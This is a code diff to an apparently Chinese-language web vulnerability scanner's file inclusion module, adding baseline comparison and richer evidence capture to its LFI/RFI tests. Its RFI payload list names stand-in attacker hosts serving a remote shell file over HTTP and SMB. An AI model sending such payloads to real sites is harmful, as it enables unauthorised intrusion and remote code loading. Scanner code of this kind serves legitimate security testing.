@@ -12,6 +12,7 @@ from urllib.parse import urlencode, urlparse, parse_qs, urlunparse
 
 from core.base import BaseModule, ScanResult, Severity, ResultType
 from core.logger import Logger
+from core.http_evidence import fetch_evidence, compare_evidence
 
 
 @dataclass
@@ -21,6 +22,10 @@ class FileInclusionPoint:
     inclusion_type: str  # lfi, rfi
     payload: str
     evidence: str
+    test_url: str = ""
+    status_code: int = 0
+    matched_pattern: str = ""
+    response_snippet: str = ""
 
 
 # LFI Payload
@@ -47,7 +52,7 @@ LFI_PAYLOADS = [
 RFI_PAYLOADS = [
     ("http://127.0.0.1/test.txt", "rfi"),
     ("http://attacker.com/shell.txt", "rfi"),
-    ("\\attacker.com\share\shell.txt", "rfi_smb"),
+    (r"\\attacker.com\share\shell.txt", "rfi_smb"),
     ("php://input", "rfi_wrapper"),
 ]
 
@@ -120,6 +125,17 @@ class FileInclusionScanner(BaseModule):
         for vuln in self.vuln_points:
             severity = Severity.HIGH if vuln.inclusion_type == 'rfi' else Severity.MEDIUM
             
+            raw_data = {
+                "vulnerability_type": "file_inclusion",
+                "url": self.base_url,
+                "method": "GET",
+                "param": vuln.parameter,
+                "injection_point": vuln.parameter,
+                "payload": vuln.payload,
+                "inclusion_type": vuln.inclusion_type,
+                "evidence": vuln.evidence,
+                "details": vuln.__dict__,
+            }
             result = ScanResult(
                 result_type=ResultType.VULNERABILITY,
                 title=f"{'RFI' if 'rfi' in vuln.inclusion_type else 'LFI'}漏洞: {vuln.parameter}",
@@ -127,7 +143,7 @@ class FileInclusionScanner(BaseModule):
                 severity=severity,
                 target=self.base_url,
                 evidence=f"参数: {vuln.parameter}\nPayload: {vuln.payload}\n证据: {vuln.evidence}",
-                raw_data=vuln.__dict__
+                raw_data=raw_data
             )
             results.append(result)
             self.add_result(result)
@@ -179,6 +195,10 @@ class FileInclusionScanner(BaseModule):
         
         async def test_param(param_name: str, original_value: str) -> Optional[FileInclusionPoint]:
             async with semaphore:
+                baseline_params = params.copy()
+                baseline_params[param_name] = original_value
+                baseline_url = self._build_url(baseline_params)
+
                 for payload, payload_type in payloads:
                     test_key = f"{param_name}:{payload[:30]}"
                     if test_key in tested:
@@ -191,17 +211,24 @@ class FileInclusionScanner(BaseModule):
                     
                     try:
                         async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
-                            async with session.get(test_url) as response:
-                                content = await response.text()
-                                
-                                for pattern in LFI_INDICATORS:
-                                    if re.search(pattern, content, re.IGNORECASE):
-                                        return FileInclusionPoint(
-                                            parameter=param_name,
-                                            inclusion_type=payload_type,
-                                            payload=payload,
-                                            evidence=f"匹配模式: {pattern}"
-                                        )
+                            baseline_ev = await fetch_evidence(session, baseline_url, method="GET", allow_redirects=False, timeout=timeout, body_limit=800)
+                            exploit_ev = await fetch_evidence(session, test_url, method="GET", allow_redirects=False, timeout=timeout, body_limit=800)
+                            _ = compare_evidence(baseline_ev, exploit_ev)
+                            content = exploit_ev.get("body_snippet", "")
+                            snippet = content[:500]
+                            
+                            for pattern in LFI_INDICATORS:
+                                if re.search(pattern, content, re.IGNORECASE):
+                                    return FileInclusionPoint(
+                                        parameter=param_name,
+                                        inclusion_type=payload_type,
+                                        payload=payload,
+                                        evidence=f"匹配模式: {pattern}",
+                                        test_url=test_url,
+                                        status_code=exploit_ev.get("status") or 0,
+                                        matched_pattern=pattern,
+                                        response_snippet=snippet
+                                    )
                                         
                     except Exception:
                         pass
